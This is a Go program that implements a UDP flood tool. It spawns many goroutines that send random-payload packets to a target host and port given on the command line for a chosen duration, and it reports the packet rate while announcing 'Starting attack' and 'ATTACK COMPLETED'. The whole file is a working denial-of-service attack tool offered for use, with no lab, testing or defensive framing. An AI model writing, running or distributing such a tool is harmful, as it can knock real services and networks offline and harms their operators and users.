package main

import (
    "flag"
    "fmt"
    "math/rand"
    "net"
    "sync"
    "time"
)

type UDPFlooder struct {
    Target     string
    Port       int
    Duration   int
    Threads    int
    PacketSize int
    stopChan   chan bool
    wg         sync.WaitGroup
    packetsSent int64
    mutex      sync.Mutex
}

func NewUDPFlooder(target string, port, duration, threads, packetSize int) *UDPFlooder {
    return &UDPFlooder{
        Target:     target,
        Port:       port,
        Duration:   duration,
        Threads:    threads,
        PacketSize: packetSize,
        stopChan:   make(chan bool),
    }
}

func (u *UDPFlooder) generatePayload() []byte {
    payload := make([]byte, u.PacketSize)
    for i := range payload {
        payload[i] = byte(rand.Intn(256))
    }
    return payload
}

func (u *UDPFlooder) floodWorker(workerID int) {
    defer u.wg.Done()
    
    conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", u.Target, u.Port))
    if err != nil {
        fmt.Printf("[Worker %d] Failed to connect: %v\n", workerID, err)
        return
    }
    defer conn.Close()
    
    fmt.Printf("[Worker %d] Started UDP flooding\n", workerID)
    
    for {
        select {
        case <-u.stopChan:
            fmt.Printf("[Worker %d] Stopping...\n", workerID)
            return
        default:
            payload := u.generatePayload()
            _, err := conn.Write(payload)
            if err == nil {
                u.mutex.Lock()
                u.packetsSent++
                u.mutex.Unlock()
            }
            
            // Small delay to prevent overwhelming
            time.Sleep(time.Microsecond * 100)
        }
    }
}

func (u *UDPFlooder) monitor() {
    start := time.Now()
    ticker := time.NewTicker(time.Second)
    defer ticker.Stop()
    
    for {
        select {
        case <-u.stopChan:
            return
        case <-ticker.C:
            elapsed := time.Since(start).Seconds()
            remaining := float64(u.Duration) - elapsed
            
            u.mutex.Lock()
            packets := u.packetsSent
            u.mutex.Unlock()
            
            rate := float64(packets) / elapsed
            fmt.Printf("\r[UDP FLOOD] Packets: %d | Rate: %.1f/s | Remaining: %.1fs", 
                      packets, rate, remaining)
        }
    }
}

func (u *UDPFlooder) Start() {
    fmt.Printf("\n[GO UDP FLOOD] Starting attack...\n")
    fmt.Printf("Target: %s:%d\n", u.Target, u.Port)
    fmt.Printf("Duration: %d seconds\n", u.Duration)
    fmt.Printf("Threads: %d\n", u.Threads)
    fmt.Printf("Packet Size: %d bytes\n\n", u.PacketSize)
    
    // Start monitor goroutine
    go u.monitor()
    
    // Start worker goroutines
    for i := 0; i < u.Threads; i++ {
        u.wg.Add(1)
        go u.floodWorker(i)
    }
    
    // Run for specified duration
    time.Sleep(time.Duration(u.Duration) * time.Second)
    
    // Stop all workers
    close(u.stopChan)
    u.wg.Wait()
    
    u.mutex.Lock()
    totalPackets := u.packetsSent
    u.mutex.Unlock()
    
    fmt.Printf("\n\n[ATTACK COMPLETED] Total packets sent: %d\n", totalPackets)
}

func main() {
    target := flag.String("t", "", "Target IP address or hostname")
    port := flag.Int("p", 80, "Target port")
    duration := flag.Int("d", 60, "Attack duration in seconds")
    threads := flag.Int("r", 100, "Number of goroutines")
    packetSize := flag.Int("s", 1024, "Packet size in bytes")
    
    flag.Parse()
    
    if *target == "" {
        fmt.Println("Error: Target is required")
        flag.Usage()
        return
    }
    
    rand.Seed(time.Now().UnixNano())
    
    flooder := NewUDPFlooder(*target, *port, *duration, *threads, *packetSize)
    flooder.Start()
}

